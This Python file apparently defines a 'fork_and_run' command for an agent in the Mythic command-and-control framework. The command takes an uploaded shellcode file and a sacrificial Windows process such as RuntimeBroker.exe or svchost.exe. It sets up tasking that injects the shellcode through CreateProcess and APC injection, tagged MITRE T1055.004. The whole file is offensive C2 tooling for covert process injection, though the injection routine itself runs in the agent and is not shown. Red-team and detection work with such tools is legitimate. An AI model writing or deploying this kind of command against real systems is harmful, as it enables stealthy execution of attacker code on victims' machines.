from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from mythic_container.MythicGoRPC import (
    SendMythicRPCFileSearch,
    MythicRPCFileSearchMessage,
)


class ForkAndRunArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="shellcode",
                cli_name="Shellcode",
                display_name="Shellcode File",
                type=ParameterType.File,
                description="Shellcode to execute in sacrificial process",
                parameter_group_info=[ParameterGroupInfo(required=True, group_name="Default")],
            ),
            CommandParameter(
                name="spawnto",
                cli_name="spawnto",
                display_name="Spawn Target",
                type=ParameterType.String,
                default_value="C:\\Windows\\System32\\RuntimeBroker.exe",
                description="Path to sacrificial process to spawn",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="timeout",
                cli_name="timeout",
                display_name="Timeout (seconds)",
                type=ParameterType.Number,
                default_value=30,
                description="Max seconds to wait for shellcode execution",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No arguments provided.")
        if self.command_line[0] != "{":
            raise Exception("Expected JSON input")
        self.load_args_from_json_string(self.command_line)


class ForkAndRunCommand(CommandBase):
    cmd = "fork_and_run"
    needs_admin = False
    help_cmd = "fork_and_run (upload shellcode)"
    description = "Execute shellcode in a sacrificial process via CreateProcess+APC injection. Agent-safe: child crashes don't affect parent."
    version = 1
    author = "b4r0n"
    argument_class = ForkAndRunArguments
    attackmapping = ["T1055.004"]
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        file_id = task.args.get_arg("shellcode")
        file_resp = await SendMythicRPCFileSearch(
            MythicRPCFileSearchMessage(TaskID=task.id, AgentFileId=file_id)
        )

        if not file_resp or not file_resp.Success or len(file_resp.Files) == 0:
            raise Exception("Shellcode file not found.")

        f = file_resp.Files[0]
        task.args.add_arg("shellcode-file-id", f.AgentFileId)
        task.args.remove_arg("shellcode")

        spawnto = task.args.get_arg("spawnto") or "C:\\Windows\\System32\\svchost.exe"
        task.display_params = f"Injecting into {spawnto}"
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        if response:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=(response if isinstance(response, str) else str(response)).encode(),
                )
            )
        return resp
